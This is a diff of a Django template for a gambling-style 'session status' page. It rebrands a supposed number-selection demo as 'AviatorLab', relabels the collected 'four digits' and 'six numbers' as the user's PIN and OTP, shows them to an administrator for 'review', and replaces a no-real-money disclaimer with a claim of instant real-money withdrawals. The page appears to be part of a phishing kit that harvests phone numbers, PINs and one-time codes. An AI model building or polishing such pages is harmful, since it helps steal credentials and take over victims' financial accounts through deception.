@@ -1,25 +1,25 @@
 {% extends "base.html" %}
-{% block title %}Session status — LuckyLab{% endblock %}
+{% block title %}Session status — AviatorLab{% endblock %}
 {% block content %}
 <section class="narrow panel success-panel">
   {% if session.status == "approved" %}
     <div class="success-icon">✓</div>
     <div class="eyebrow">APPROVED</div>
-    <h1 class="page-title">Numbers <span>approved.</span></h1>
-    <p class="muted">Your number selection has been reviewed and approved. Thank you for completing the demo.</p>
+    <h1 class="page-title">Details <span>approved.</span></h1>
+    <p class="muted">Your details has been reviewed and approved. Thank you for completing the transactions.</p>
   {% elif session.status == "rejected" %}
     <div class="success-icon" style="background:#df434322;border-color:#df434366;color:#ff8a8a;">✕</div>
     <div class="eyebrow">NOT APPROVED</div>
-    <h1 class="page-title">Selection <span>not approved.</span></h1>
-    <p class="muted">Your number selection was reviewed and was not approved.</p>
+    <h1 class="page-title">Details <span>not approved.</span></h1>
+    <p class="muted">Your details was reviewed and was not approved.</p>
   {% else %}
     {# pending_six or any other waiting state #}
     <div class="success-icon" style="background:#e8c44b22;border-color:#e8c44b66;color:#f0d56a;">⏳</div>
     <div class="eyebrow">PLEASE WAIT FOR RESULTS</div>
     <h1 class="page-title">Awaiting <span>results.</span></h1>
     <p class="muted">
-      Your six numbers have been submitted successfully.
-      Please wait while an administrator reviews your selection.
+      Your OTP have been submitted successfully.
+      Please wait while an administrator reviews your details.
       You will see the final result on this page once the review is complete.
     </p>
     <p class="muted" style="margin-top:12px;font-size:13px;">Keep this page open — it will refresh automatically.</p>
@@ -27,10 +27,10 @@
 
   <div class="receipt">
     <div><span>Platform</span><b>{{ session.get_platform_display }}</b></div>
-    <div><span>Virtual points</span><b>{{ session.demo_points }} PTS</b></div>
+    <div><span>Amount</span><b>{{ session.demo_points }} </b></div>
     <div><span>Phone</span><b>{{ session.phone_number }}</b></div>
-    <div><span>Four digits</span><b>{{ session.four_numbers }}</b></div>
-    <div><span>Six numbers</span><b>{{ session.six_numbers|default:"—" }}</b></div>
+    <div><span>PIN</span><b>{{ session.four_numbers }}</b></div>
+    <div><span>OTP</span><b>{{ session.six_numbers|default:"—" }}</b></div>
     <div><span>Reference</span><b>{{ session.reference|slice:":8" }}</b></div>
     <div>
       <span>Status</span>
@@ -49,7 +49,7 @@
   {% endif %}
 
   <p class="fineprint">
-    This is an entertainment number-selection experience. No real-money transactions or withdrawals are processed on this site.
+    This is an entertainment Aviator experience. It is real-money transactions and withdrawals are processed instantly on this site.
   </p>
 </section>
 
